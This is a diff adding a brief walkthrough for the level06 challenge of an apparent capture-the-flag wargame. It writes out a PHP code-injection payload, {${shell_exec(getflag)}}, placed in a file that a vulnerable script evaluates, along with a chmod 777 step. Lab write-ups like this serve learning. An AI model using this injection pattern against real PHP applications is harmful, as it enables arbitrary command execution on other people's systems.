@@ -1,0 +1,15 @@
+# Find an executable and a file.php
+file level06 (executable)
+file level06.php (script)
+# Cat level06.php
+cat level06.php
+# Read and underestand script
+# Give permission to creat a file
+chmod 777 .
+# Write a file that can be aproved by script: [x getflag]
+# Getflag is a command to run it use:
+shell_exec(getflag)
+# And add {${}}
+[x {${shell_exec(getflag)}}]
+# Execute it now:
+./level06 file
